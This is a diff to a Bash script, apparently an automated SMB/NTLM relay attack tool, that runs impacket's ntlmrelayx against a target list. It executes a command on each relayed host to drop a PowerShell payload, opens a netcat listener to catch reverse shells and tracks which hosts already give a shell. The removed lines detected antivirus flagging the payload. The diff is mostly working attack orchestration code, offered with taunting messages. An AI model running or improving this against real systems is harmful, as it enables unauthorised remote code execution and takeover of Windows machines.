@@ -28,7 +28,7 @@ trap ctrl_c INT
 function cleaning(){
 
 	tmux kill-session -t 'smbautorelay*' &>/dev/null
-	rm -f $(pwd)/shell.ps1 $(pwd)/impacket/ntlmrelayx.log $(pwd)/impacket/hostsStatus.tmp $(pwd)/impacket/targets.txt &>/dev/null
+	rm -f $(pwd)/shell.ps1 $(pwd)/impacket/hostsStatus.tmp $(pwd)/impacket/targets.txt &>/dev/null
 
 }
 
@@ -206,10 +206,21 @@ function checkTargets(){
 		fi
 	done < $targets
 
-	if [ ! -e $(pwd)/impacket/targets.txt ];then echo -e "${redColour}[:(]${endColour} No targets available to perform the relaying\n"; badExit; fi
+	if [ ! -e $(pwd)/impacket/targets.txt ];then echo -e "${redColour}[:(]${endColour} No targets left! Go find more!\n"; badExit; fi
 
 	cat $(pwd)/impacket/targets.txt | sort -u > $(pwd)/targets.tmp
 	mv $(pwd)/targets.tmp $(pwd)/impacket/targets.txt
+
+	while read line; do
+		if [ "$(netstat -tunalp | grep '\/nc' | grep 'ESTABLISHED' | grep "$line")" != "" ];then
+			echo -e "\t${yellowColour}[-,-]${endColour} You already have a shell at $line! Please do not bully and remove it from targets.\n"
+			echo $line >> $(pwd)/impacket/hostsStatus.tmp
+		fi
+	done < $(pwd)/impacket/targets.txt
+
+	if [[ "$(wc -l $(pwd)/impacket/hostsStatus.tmp 2>/dev/null | awk '{print $1}')" == "$(wc -l $(pwd)/impacket/targets.txt 2>/dev/null | awk '{print $1}')" ]];then
+		echo -e "${greenColour}[:D]${endColour} Wow! You got a shell on all targets! You are a H4X0R!\n"; goodExit
+	fi
 
 }
 
@@ -269,24 +280,14 @@ function targetStatus(){
 	status=$(grep 'Authenticating against smb://'$1 $(pwd)/impacket/ntlmrelayx.log 2>/dev/null | tail -1 | awk '{print $NF}')
 
 	if [[ "$status" == "SUCCEED" || "$status" == "SUCCEE" ]];then
-
-		echo -e "\t${greenColour}[:)]${endColour} Authentication against $1 succeed! Dropping the payload..."; 
+		echo -e "\t${greenColour}[:)]${endColour} Authentication against $1 succeed! Dropping the payload..."; sleep 2 
 		
-		#while [ "$(grep "Executed specified command on host: $1" $(pwd)/impacket/ntlmrelayx.log)" == "" ];do sleep 0.3; done
-		
-		if [ "$(grep 'ScriptContainedMaliciousContent' $(pwd)/impacket/ntlmrelayx.log 2>/dev/null)" == "" ];then sleep 5; fi
-
-		check=$(grep "Executed specified command on host: $1" -A11 $(pwd)/impacket/ntlmrelayx.log | tail -1 | awk '{print $4}' | cut -d',' -f1)
-		check2=$(grep "Executed specified command on host: $1" -A12 $(pwd)/impacket/ntlmrelayx.log | tail -1 | awk '{print $4}' | cut -d',' -f1)
-		if [[ "$check" == "ScriptContainedMaliciousContent" || "$check2" == "ScriptContainedMaliciousContent" ]];then 
-			echo -e "\t${redColour}[D:]${endColour} Bad news! Host AV flagged the payload\n"
-			echo $1 >> $(pwd)/impacket/hostsStatus.tmp
-		elif [ "$(netstat -tnualp | grep '/nc' | grep "ESTABLISHED" | grep "$1")" == "" ];then 
-			echo -e "\t${redColour}[:(]${endColour} Unable to execute the payload.\n"
+		if [ "$(netstat -tnualp | grep '/nc' | grep "ESTABLISHED" | grep "$1")" == "" ];then 
+			echo -e "\t${redColour}[:(]${endColour} Unable to execute the payload. '$(pwd)/impacket/ntlmrelayx.log' file is your friend.\n"
 			echo $1 >> $(pwd)/impacket/hostsStatus.tmp
 		else echo; fi
 	elif [ "$status" == "FAILED" ];then
-		echo -e "\t${redColour}[:(]${endColour} Authentication against $1 failed!\n"; sleep 0.3
+		echo -e "\t${redColour}[:(]${endColour} Authentication against $1 failed! Not cool...\n"; sleep 0.3
 		echo $1 >> $(pwd)/impacket/hostsStatus.tmp
 	fi
 
@@ -343,7 +344,7 @@ function relayingAttack(){
 	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys "python3 -m http.server" C-m &>/dev/null && tmux split-window &>/dev/null
 	if [ $? -ne 0 ];then bTmux; else sleep 0.3; fi
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.3; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket...\n"; sleep 0.3; fi
 
 	python3 $(pwd)/ntlmrelayx.py -h &>/dev/null
 	if [ $? -ne 0 ];then python3 -m pip install -q impacket &>/dev/null; fi
@@ -352,41 +353,35 @@ function relayingAttack(){
 	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys -t $paneID "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\"" C-m &>/dev/null
 	if [ $? -ne 0 ];then bTmux; fi
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} port $lport open to receive the connection\n"; sleep 0.3; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Opening port $lport...\n"; sleep 0.3; fi
 
 	checkDependency "rlwrap"
 
 	terminal=$(ps -o comm= -p "$(($(ps -o ppid= -p "$(($(ps -o sid= -p "$$")))")))")
-	ncCommand='tput setaf 7; rlwrap nc -lvvnp '$lport
-	$terminal -hold -T $terminal -e "$SHELL -c '$ncCommand'" &>/dev/null &
-	terminal_nc_PID=$!
+	if [ "${terminal:(-1)}" == "-" ];then terminal="${terminal::-1}"; fi
+	ncCommand="rlwrap nc -lvvnp $lport"
+	$terminal -e $ncCommand &>/dev/null &
+	terminal_nc_PID=$! && sleep 2
 	if [ "$(netstat -tnualp | grep '/nc' | grep 'LISTEN' | grep $lport)" == "" ];then
 		$terminal --window --hide-menubar -e "$SHELL -c '$ncCommand'" &>/dev/null &
-	    terminal_nc_PID=$!
+	terminal_nc_PID=$! && sleep 2
     fi
-
-	sleep 2
 
 	if [ "$(netstat -tnualp | grep '/nc' | grep 'LISTEN' | grep $lport)" == "" ];then
 		checkDependency "xterm";
-		xterm -hold -T 'XTerm' -e "$SHELL -c '$ncCommand'" &>/dev/null &
+		xterm -T 'XTerm' -e "$SHELL -c '$ncCommand'" &>/dev/null &
 	    terminal_nc_PID=$!
 	fi
-	
-	sleep 2
 
+	while [ "$(netstat -tnualp | grep '/nc' | grep 'LISTEN' | grep $lport)" == "" ];do sleep 1; done
+
+	
     if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Relay attack deployed, waiting for LLMNR/NBT-NS request...\n"; fi
 
 	portStatus='LISTEN'
 
 	touch $(pwd)/impacket/hostsStatus.tmp &>/dev/null
 	
-	while read line; do
-		if [ "$(netstat -tunalp | grep '\/nc' | grep 'ESTABLISHED' | grep "$line")" != "" ];then
-			echo -e "\t${yellowColour}[-.-]${endColour} You already have a shell at $line! Please do not bully and remove it from targets.\n"
-			echo $line >> $(pwd)/impacket/hostsStatus.tmp
-		fi
-	done < $(pwd)/impacket/targets.txt
 
 	tmux resize-pane -Z -L 8 &>/dev/null
 	if [ $? -ne 0 ];then bTmux; fi
@@ -396,15 +391,21 @@ function relayingAttack(){
 
 	while [ "$portStatus" == "LISTEN" ];do
 		while read line; do
-				if [ "$(grep $line $(pwd)/impacket/hostsStatus.tmp 2>/dev/null)" == '' ];then targetStatus "$line";	fi
+			if [[ "$portStatus" == "LISTEN" && "$(grep $line $(pwd)/impacket/hostsStatus.tmp 2>/dev/null)" == '' ]];then targetStatus "$line"; fi
+			portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u);
 		done < $(pwd)/impacket/targets.txt
 
 		if [[ "$(wc -l $(pwd)/impacket/hostsStatus.tmp 2>/dev/null | awk '{print $1}')" == "$(wc -l $(pwd)/impacket/targets.txt 2>/dev/null | awk '{print $1}')" ]];then
-			echo -e "\t${redColour}[:(]${endColour} No targets left to perform the relay\n"; break
+			echo -e "\t${redColour}[:(]${endColour} No targets left! Go find more!\n"; break
 		fi
 		portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u);
 	done
 
+	kill -9 $updateNtlmRelayxLog &>/dev/null
+	wait $updateNtlmRelayxLog &>/dev/null
+
+	tmux capture-pane -p -S - > $(pwd)/impacket/ntlmrelayx.log
+	if [ $? -ne 0 ];then bTmux; fi
 
 	rhost=$(netstat -tnualp | grep $lport | awk '{print $5}' | tail -1 | awk -F: '{print $1}')
 	checkrhost=''
@@ -418,9 +419,6 @@ function relayingAttack(){
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Killing Tmux session 'smbautorelay'\n"; sleep 0.3; fi
 	
-	kill -9 $updateNtlmRelayxLog &>/dev/null
-	wait $updateNtlmRelayxLog &>/dev/null
-
 	goodExit
 
 }
